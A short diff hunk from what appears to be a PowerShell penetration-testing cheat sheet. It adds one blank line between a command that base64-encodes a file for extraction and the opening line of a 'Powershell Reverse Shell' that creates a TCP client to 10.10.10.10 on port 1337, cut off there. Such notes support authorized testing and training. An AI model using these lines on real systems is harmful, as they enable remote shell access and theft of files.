@@ -293,6 +293,7 @@ Get-ChildItem -Path cert:\LocalMachine
 ```powershell
 powershell -c [convert]::ToBase64String((cat $file -Encoding byte)) 
 ```
+
 ## Powershell Reverse Shell
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10', 1337);
